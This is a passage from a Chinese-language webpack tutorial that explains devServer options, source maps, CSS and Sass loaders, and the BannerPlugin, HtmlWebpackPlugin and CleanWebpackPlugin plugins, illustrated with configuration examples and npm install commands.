&#x27;X-foo&#x27;: &#x27;<span class="hljs-number">112233</span>&#x27;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>historyApiFallback：</strong>该配置项属性是用来应对返回404页面时定向跳转到特定页面的。一般是应用在单页应用，比如在访问路由时候，访问不到该路由的时候，通过该配置项，设置属性值为true的时候，会自动跳转到 index.html下。当然我们也可以手动通过 正则来匹配路由</li></ul><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-comment">// 跳到index.html页面 </span><br>historyApiFallback: <span class="hljs-keyword">true</span><br><br><span class="hljs-comment">// 使用正则来匹配路由</span><br>historyApiFallback: &#123;<br>  rewrites: [<br>    &#123; <span class="hljs-keyword">from</span>: <span class="hljs-regexp">/^\/user/</span>, to: <span class="hljs-string">&#x27;/user.html&#x27;</span> &#125;,<br>    &#123; <span class="hljs-keyword">from</span>: <span class="hljs-regexp">/^\/home/</span>, to: <span class="hljs-string">&#x27;/home.html&#x27;</span> &#125;<br>  ]<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>hot：</strong>该配置项是指模块替换功能，DevServer 默认行为是在发现源代码被更新后通过自动刷新整个页面来做到实时预览的，但是开启模块热替换功能后，它是通过在不刷新整个页面的情况下通过使用新模块替换旧模块来做到实时预览的。</li><li><strong>proxy :</strong> 有时候我们使用webpack在本地启动服务器的时候，由于我们使用的访问的域名是 <a href="http://localhost:8081/">http://localhost:8081</a> 这样的，但是我们服务端的接口是其他的，可以通过该配置来解决跨域的问题</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span> 假设服务端接口域名为：http:<span class="hljs-regexp">//</span>news.baidu.com<br>proxy: &#123;<br>  <span class="hljs-string">&#x27;/api&#x27;</span>: &#123;<br>    target: <span class="hljs-string">&#x27;http://news.baidu.com&#x27;</span>, <span class="hljs-regexp">//</span> 目标接口的域名<br>    <span class="hljs-regexp">//</span> secure: true,  <span class="hljs-regexp">//</span> https 的时候 使用该参数<br>    changeOrigin: true,  <span class="hljs-regexp">//</span> 是否跨域<br>    pathRewrite: &#123;<br>      <span class="hljs-string">&#x27;^/api&#x27;</span> : <span class="hljs-string">&#x27;&#x27;</span>  <span class="hljs-regexp">//</span> 重写路径<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>open：</strong>该属性用于DevServer启动且第一次构建完成时，自动使用我们的系统默认浏览器去打开网页。</li><li><strong>compress：</strong>配置是否启用 gzip 压缩，boolean 类型，默认为 false</li></ul><ol start="3"><li>添加配置项到webpack.config.js</li></ol><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs lua">devServer: &#123;<br>    server: <span class="hljs-string">&quot;http&quot;</span>,<br>    static: <span class="hljs-built_in">path</span>.join(__dirname, <span class="hljs-string">&quot;dist&quot;</span>), // 原contentBase<br>    headers: [<br>    &#123;<br>        key: <span class="hljs-string">&#x27;X-Custom&#x27;</span>,<br>        value: <span class="hljs-string">&#x27;foo&#x27;</span>,<br>    &#125;,<br>    &#123;<br>        key: <span class="hljs-string">&#x27;Y-Custom&#x27;</span>,<br>        value: <span class="hljs-string">&#x27;bar&#x27;</span>,<br>    &#125;,<br>    ],<br>    // hot: <span class="hljs-literal">true</span>, // 模块替换功能，实时预览<br>    hot: <span class="hljs-string">&quot;only&quot;</span>, // 在构建失败的情况下启用无需页面刷新的热模块替换作为后备<br>    host: <span class="hljs-string">&quot;localhost&quot;</span>,<br>    port: <span class="hljs-number">8080</span>, // 开启服务器的端口号<br>    <span class="hljs-built_in">open</span>: <span class="hljs-literal">true</span>, // devserver启动且第一次完成构建时，自动使用系统默认浏览器打开网页<br>    client: &#123; // 编译出错时在浏览器上显示错误<br>        overlay: &#123;<br>            warnings: <span class="hljs-literal">false</span>,<br>            errors: <span class="hljs-literal">true</span>,<br>        &#125;<br>    &#125;,<br>    proxy: &#123; // 跨域问题<br>        <span class="hljs-string">&#x27;/api&#x27;</span>: &#123;<br>            target: <span class="hljs-string">&#x27;http://localhost:8888&#x27;</span>, // 目标接口的域名（服务器接口）<br>            changeOrigin: <span class="hljs-literal">true</span>, // 是否跨域<br>            secure: <span class="hljs-literal">false</span>, // 代理地址没证书也可以代理成功 <br>            pathRewrite: &#123;<br>                <span class="hljs-string">&#x27;^api&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span> // 重写路径<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;,<br></code></pre></td></tr></table></figure><ol start="4"><li>在package.json文件中添加启动命令</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-attr">&quot;scripts&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;build&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;webpack&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;dev&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;webpack-dev-server --open&quot;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br></code></pre></td></tr></table></figure><p>我们用dev来启动本地服务器， webpack-dev-server就是启动服务器的命令，- -open是用于启动完服务器后自动打开浏览器，这时候我们自定义命令方式的便捷性就体现出来了，可以多个命令集成在一起运行，即我们定义了一个dev命令名称就可以同时运行了webpack-dev-server和- -open两个命令</p><p>现在在终端输入npm run dev 运行服务器</p><p>这样我们就可以在<a href="http://localhost:8088/%E4%B8%AD%E6%9F%A5%E7%9C%8B%E9%A1%B5%E9%9D%A2">http://localhost:8088/中查看页面</a> (退出服务器，可使用ctrl+c后，再按y确认即可退出服务器运行)</p><ol start="5"><li>source maps调试配置</li></ol><p>作为开发，代码调试当然少不了，那么问题来了，经过打包后的文件，你是不容易找到出错的地方的，<code>Source Map</code>就是用来解决这个问题的。通过如下配置，我们会在打包时生成对应于打包文件的<code>.map</code>文件，使得编译后的代码可读性更高，更易于调试。</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-comment">// webpack.config.js</span><br>const path = require(<span class="hljs-string">&#x27;path&#x27;</span>);<br>module.exports = &#123;<br>  entry: path.<span class="hljs-built_in">join</span>(<span class="hljs-variable">__dirname</span>, <span class="hljs-string">&quot;/src/index.js&quot;</span>), <span class="hljs-comment">// 入口文件</span><br>  output: &#123;<br>    path: path.<span class="hljs-built_in">join</span>(<span class="hljs-variable">__dirname</span>, <span class="hljs-string">&quot;/dist&quot;</span>), <span class="hljs-comment">// 打包后的文件存放的地方 </span><br>    filename: <span class="hljs-string">&quot;bundle.js&quot;</span> <span class="hljs-comment">// 打包后输出文件的文件名</span><br>  &#125;,<br>  devServer: &#123;<br>    contentBase: path.<span class="hljs-built_in">join</span>(<span class="hljs-variable">__dirname</span>, <span class="hljs-string">&quot;dist&quot;</span>),<br>    hot: <span class="hljs-literal">true</span>,<br>    port: <span class="hljs-string">&#x27;8080&#x27;</span>,<br>    inline: <span class="hljs-literal">true</span>,<br>    open: <span class="hljs-literal">true</span>,<br>    overlay: <span class="hljs-literal">true</span>,<br>  &#125;,<br>  devtool: <span class="hljs-string">&#x27;source-map&#x27;</span> <span class="hljs-comment">// 会生成对于调试的完整的.map文件，同时也会减慢打包速度</span><br>&#125;<br></code></pre></td></tr></table></figure><p>配置好后，我们再次运行npm run build进行打包，这时我们会发现在dist文件夹中多出了一个bundle.js.map。如果我们的代码有bug，在浏览器的调试工具中会提示错误出现的位置，这就是devtool：’source-map’ 配置项的作用。</p><h4 id="1-8-Loaders"><a href="#1-8-Loaders" class="headerlink" title="1.8 Loaders"></a>1.8 Loaders</h4><p>loaders是webpack最强大的功能之一，通过不同的loader，webpack有能力调用外部的脚本或工具，实现对不同格式的文件的处理，例如把scss转为css，将ES66、ES7等语法转化为当前浏览器能识别的语法，将JSX转化为js等多项功能。Loaders需要单独安装并且需要在webpack.comfig.js中的modules配置项下进行配置，Loaders的配置包括以下几方面：</p><ul><li>test：一个用以匹配loaders所处理文件的拓展名的正则表达式（必须）</li><li>loader：loader的名称（必须）</li><li>include&#x2F;exclude： 手动添加必须处理的文件（文件夹）或屏蔽不需要处理的文件（文件夹）（可选）</li><li>options： 为loaders提供额外的设置选项（可选）</li></ul><ol><li>配置css-loader</li></ol><p>如果我们要加载一个css文件，需要安装style-loader和css-loader</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">npm <span class="hljs-keyword">install</span> style-loader css-loader -D<br></code></pre></td></tr></table></figure><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-comment">// webpack.config.js</span><br>const path = require(<span class="hljs-string">&#x27;path&#x27;</span>);<br>module.exports = &#123;<br>  entry: path.<span class="hljs-built_in">join</span>(<span class="hljs-variable">__dirname</span>, <span class="hljs-string">&quot;/src/index.js&quot;</span>), <span class="hljs-comment">// 入口文件</span><br>  output: &#123;<br>    path: path.<span class="hljs-built_in">join</span>(<span class="hljs-variable">__dirname</span>, <span class="hljs-string">&quot;/dist&quot;</span>), <span class="hljs-comment">// 打包后的文件存放的地方 </span><br>    filename: <span class="hljs-string">&quot;bundle.js&quot;</span> <span class="hljs-comment">// 打包后输出文件的文件名</span><br>  &#125;,<br>  devServer: &#123;<br>    contentBase: path.<span class="hljs-built_in">join</span>(<span class="hljs-variable">__dirname</span>, <span class="hljs-string">&quot;dist&quot;</span>),<br>    hot: <span class="hljs-literal">true</span>,<br>    port: <span class="hljs-string">&#x27;8080&#x27;</span>,<br>    inline: <span class="hljs-literal">true</span>,<br>    open: <span class="hljs-literal">true</span>,<br>    overlay: <span class="hljs-literal">true</span>,<br>  &#125;,<br>  devtool: <span class="hljs-string">&#x27;source-map&#x27;</span>, <span class="hljs-comment">// 会生成对于调试的完整的.map文件，但同时也会减慢打包速度</span><br>  module: &#123;<br>    rules: [<br>      &#123;<br>        test: /\.css$/,   <span class="hljs-comment">// 正则匹配以.css结尾的文件</span><br>        use: [<span class="hljs-string">&#x27;style-loader&#x27;</span>, <span class="hljs-string">&#x27;css-loader&#x27;</span>]  <span class="hljs-comment">// 需要用的loader，一定是这个顺序，因为调用loader是从右往左编译的</span><br>      &#125;<br>    ]<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们在src文件夹下新建index.css文件，设置body的样式</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/* index.css */</span><br><span class="hljs-selector-tag">body</span> &#123;<br>    <span class="hljs-attribute">background</span>: gray;<br>&#125;复制代码<br></code></pre></td></tr></table></figure><p>在src文件夹下的index.js引入它</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-comment">// index.js</span><br><span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;./index.css&#x27;</span> <span class="hljs-comment">// 导入css</span><br><br><span class="hljs-keyword">const</span> hello = require(<span class="hljs-string">&#x27;./hello.js&#x27;</span>);<br><span class="hljs-built_in">document</span>.<span class="hljs-built_in">querySelector</span>(<span class="hljs-string">&quot;#root&quot;</span>).appendChild(hello());复制代码<br></code></pre></td></tr></table></figure><p>运行npm run dev启动服务器，会发现页面背景颜色变成了灰色</p><ol start="2"><li>配置sass</li></ol><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">npm install sass-loader <span class="hljs-keyword">node</span><span class="hljs-title">-sass</span> -D // 因为sass-loader依赖于<span class="hljs-keyword">node</span><span class="hljs-title">-sass</span>，所以还要安装<span class="hljs-keyword">node</span><span class="hljs-title">-sass</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span> webpack.config.js<br>const path = require(<span class="hljs-string">&#x27;path&#x27;</span>);<br>module.exports = &#123;<br>  entry: path.join(__dirname, <span class="hljs-string">&quot;/src/index.js&quot;</span>), <span class="hljs-regexp">//</span> 入口文件<br>  output: &#123;<br>    path: path.join(__dirname, <span class="hljs-string">&quot;/dist&quot;</span>), <span class="hljs-regexp">//</span> 打包后的文件存放的地方 <br>    filename: <span class="hljs-string">&quot;bundle.js&quot;</span> <span class="hljs-regexp">//</span> 打包后输出文件的文件名<br>  &#125;,<br>  devServer: &#123;<br>    contentBase: path.join(__dirname, <span class="hljs-string">&quot;dist&quot;</span>),<br>    hot: true,<br>    port: <span class="hljs-string">&#x27;8080&#x27;</span>,<br>    inline: true,<br>    open: true,<br>    overlay: true,<br>  &#125;,<br>  devtool: <span class="hljs-string">&#x27;source-map&#x27;</span>, <span class="hljs-regexp">//</span> 会生成对于调试的完整的.map文件，但同时也会减慢打包速度<br>  module: &#123;<br>    rules: [<br>      &#123;<br>        test: <span class="hljs-regexp">/\.css$/</span>,   <span class="hljs-regexp">//</span> 正则匹配以.css结尾的文件<br>        use: [<span class="hljs-string">&#x27;style-loader&#x27;</span>, <span class="hljs-string">&#x27;css-loader&#x27;</span>]  <span class="hljs-regexp">//</span> 需要用的loader，一定是这个顺序，因为调用loader是从右往左编译的<br>      &#125;,<br>      &#123;<br>        test: <span class="hljs-regexp">/\.(scss|sass)$/</span>,   <span class="hljs-regexp">//</span> 正则匹配以.scss和.sass结尾的文件<br>        use: [<span class="hljs-string">&#x27;style-loader&#x27;</span>, <span class="hljs-string">&#x27;css-loader&#x27;</span>, <span class="hljs-string">&#x27;sass-loader&#x27;</span>]  <span class="hljs-regexp">//</span> 需要用的loader，一定是这个顺序，因为调用loader是从右往左编译的<br>      &#125;<br>    ]<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-9-插件"><a href="#1-9-插件" class="headerlink" title="1.9 插件"></a>1.9 插件</h4><p>插件（Plugins）是用来拓展Webpack功能的，它们会在整个构建过程中生效，执行相关的任务。<br>Loaders和Plugins常常被弄混，但是他们其实是完全不同的东西，可以这么来说，loaders是在打包构建过程中用来处理源文件的（JSX，Scss，Less..），一次处理一个，插件并不直接操作单个文件，它直接对整个构建过程其作用。</p><ol><li>使用插件</li></ol><p>如需使用某个插件，需要通过npm进行安装，然后在webpack.config.js配置文件的plugins配置项中添加该插件的实例，下面我们先来使用一个简单的版权声明插件。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span> webpack.config.js<br>const path = require(<span class="hljs-string">&#x27;path&#x27;</span>);<br>const webpack = require(<span class="hljs-string">&#x27;webpack&#x27;</span>);  <span class="hljs-regexp">//</span> 这个插件不需要安装，是基于webpack的，需要引入webpack模块<br>module.exports = &#123;<br>  entry: path.join(__dirname, <span class="hljs-string">&quot;/src/index.js&quot;</span>), <span class="hljs-regexp">//</span> 入口文件<br>  output: &#123;<br>    path: path.join(__dirname, <span class="hljs-string">&quot;/dist&quot;</span>), <span class="hljs-regexp">//</span> 打包后的文件存放的地方 <br>    filename: <span class="hljs-string">&quot;bundle.js&quot;</span> <span class="hljs-regexp">//</span> 打包后输出文件的文件名<br>  &#125;,<br>  devServer: &#123;<br>    contentBase: path.join(__dirname, <span class="hljs-string">&quot;dist&quot;</span>),<br>    hot: true,<br>    port: <span class="hljs-string">&#x27;8080&#x27;</span>,<br>    inline: true,<br>    open: true,<br>    overlay: true,<br>  &#125;,<br>  devtool: <span class="hljs-string">&#x27;source-map&#x27;</span>, <span class="hljs-regexp">//</span> 会生成对于调试的完整的.map文件，但同时也会减慢打包速度<br>  module: &#123;<br>    rules: [<br>      &#123;<br>        test: <span class="hljs-regexp">/\.css$/</span>,   <span class="hljs-regexp">//</span> 正则匹配以.css结尾的文件<br>        use: [<span class="hljs-string">&#x27;style-loader&#x27;</span>, <span class="hljs-string">&#x27;css-loader&#x27;</span>]  <span class="hljs-regexp">//</span> 需要用的loader，一定是这个顺序，因为调用loader是从右往左编译的<br>      &#125;,<br>      &#123;<br>        test: <span class="hljs-regexp">/\.(scss|sass)$/</span>,   <span class="hljs-regexp">//</span> 正则匹配以.scss和.sass结尾的文件<br>        use: [<span class="hljs-string">&#x27;style-loader&#x27;</span>, <span class="hljs-string">&#x27;css-loader&#x27;</span>, <span class="hljs-string">&#x27;sass-loader&#x27;</span>]  <span class="hljs-regexp">//</span> 需要用的loader，一定是这个顺序，因为调用loader是从右往左编译的<br>      &#125;<br>    ]<br>  &#125;,<br>  plugins: [<br>    new webpack.BannerPlugin(<span class="hljs-string">&#x27;版权所有，翻版必究&#x27;</span>)  <span class="hljs-regexp">//</span> new一个插件的实例 <br>  ]<br>&#125;<br></code></pre></td></tr></table></figure><p>运行npm run build 打包后，我们查看dist下面的bundle.js文件显示如下：</p><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2019/12/24/16f374c31dadb6c4~tplv-t2oaga2asx-zoom-in-crop-mark:3024:0:0:0.awebp" alt="img"></p><ol start="2"><li>自动生成html文件（HtmlWebpackPlugin）</li></ol><p>到目前为止我们都是使用一开始建好的index.html文件，而且也是手动引入bundle.js，要是以后我们引入不止一个js文件，而且更改js文件名的话，也得手动更改index.html中的js文件名，所以能不能自动生成index.html且自动引用打包后的js呢？HtmlWebpackPlugin插件就是用来解决这个问题的</p><p>我们对项目结构进行一些更改：把整个dist文件夹删除；在src文件夹下新建一个index.html(名称自定义)文件模板（当然这个是可选的，因为就算不设置模板，HtmlWebpackPlugin插件也会生成默认html文件，这里我们设置模块会让我们的开发更加灵活），如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- index.html --&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;root&#x27;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>复制代码<br></code></pre></td></tr></table></figure><p>安装HtmlWebpackPlugin插件</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">npm <span class="hljs-keyword">install</span> html-webpack-plugin -D<br></code></pre></td></tr></table></figure><p>引入HtmlWebpackPlugin插件，并配置了引用了我们设置的模板，如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span> webpack.config.js<br>const path = require(<span class="hljs-string">&#x27;path&#x27;</span>);<br>const webpack = require(<span class="hljs-string">&#x27;webpack&#x27;</span>);  <span class="hljs-regexp">//</span> 这个插件不需要安装，是基于webpack的，需要引入webpack模块<br>const HtmlWebpackPlugin = require(<span class="hljs-string">&#x27;html-webpack-plugin&#x27;</span>); <span class="hljs-regexp">//</span> 引入HtmlWebpackPlugin插件<br>module.exports = &#123;<br>  entry: path.join(__dirname, <span class="hljs-string">&quot;/src/index.js&quot;</span>), <span class="hljs-regexp">//</span> 入口文件<br>  output: &#123;<br>    path: path.join(__dirname, <span class="hljs-string">&quot;/dist&quot;</span>), <span class="hljs-regexp">//</span> 打包后的文件存放的地方 <br>    filename: <span class="hljs-string">&quot;bundle.js&quot;</span> <span class="hljs-regexp">//</span> 打包后输出文件的文件名<br>  &#125;,<br>  devServer: &#123;<br>    contentBase: path.join(__dirname, <span class="hljs-string">&quot;dist&quot;</span>),<br>    hot: true,<br>    port: <span class="hljs-string">&#x27;8080&#x27;</span>,<br>    inline: true,<br>    open: true,<br>    overlay: true,<br>  &#125;,<br>  devtool: <span class="hljs-string">&#x27;source-map&#x27;</span>, <span class="hljs-regexp">//</span> 会生成对于调试的完整的.map文件，但同时也会减慢打包速度<br>  module: &#123;<br>    rules: [<br>      &#123;<br>        test: <span class="hljs-regexp">/\.css$/</span>,   <span class="hljs-regexp">//</span> 正则匹配以.css结尾的文件<br>        use: [<span class="hljs-string">&#x27;style-loader&#x27;</span>, <span class="hljs-string">&#x27;css-loader&#x27;</span>]  <span class="hljs-regexp">//</span> 需要用的loader，一定是这个顺序，因为调用loader是从右往左编译的<br>      &#125;,<br>      &#123;<br>        test: <span class="hljs-regexp">/\.(scss|sass)$/</span>,   <span class="hljs-regexp">//</span> 正则匹配以.scss和.sass结尾的文件<br>        use: [<span class="hljs-string">&#x27;style-loader&#x27;</span>, <span class="hljs-string">&#x27;css-loader&#x27;</span>, <span class="hljs-string">&#x27;sass-loader&#x27;</span>]  <span class="hljs-regexp">//</span> 需要用的loader，一定是这个顺序，因为调用loader是从右往左编译的<br>      &#125;<br>    ]<br>  &#125;,<br>  plugins: [<br>    new webpack.BannerPlugin(<span class="hljs-string">&#x27;版权所有，翻版必究&#x27;</span>),  <span class="hljs-regexp">//</span> new一个插件的实例 <br>    new HtmlWebpackPlugin(&#123;<br>      template: path.join(__dirname, <span class="hljs-string">&quot;/src/index.html&quot;</span>)<span class="hljs-regexp">//</span> new一个这个插件的实例，并传入相关的参数<br>    &#125;)<br>  ]<br>&#125;<br></code></pre></td></tr></table></figure><p>运行npm run build进行打包，dist文件夹自动生成，包含index.html、bundle.js、bundle.js.map三个文件</p><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2019/12/24/16f374c312cdd4f9~tplv-t2oaga2asx-zoom-in-crop-mark:3024:0:0:0.awebp" alt="img">!</p><p>为什么会自动生成dist文件夹呢？因为我们在output出口配置项中定义了出口文件所在的位置为dist文件夹，且出口文件名为bundle.js，所以HtmlWebpackPlugin会自动帮你在 dist&#x2F;index.html 中引用名为bundle.js文件，如果你在webpack.config.js文件中更改了出口文件名，dist&#x2F;index.html 中也会自动更改该文件名，这样以后修改起来是不是方便多了？</p><ol start="3"><li>清理dist文件夹（CleanWebpackPlugin）</li></ol><p>webpack会生成文件，然后将这些文件放置在dist文件夹中，但是webpack无法追踪到哪些文件是实际在项目中用到的。通常，在每次构建前清理dist文件夹，是比较推荐的做法，因此只会生成用到的文件，这时候就用到CleanWebpackPlugin插件了。</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">npm <span class="hljs-keyword">install</span> clean-webpack-plugin -D<br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// webpack.config.js</span><br><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">const</span> webpack = <span class="hljs-built_in">require</span>(<span 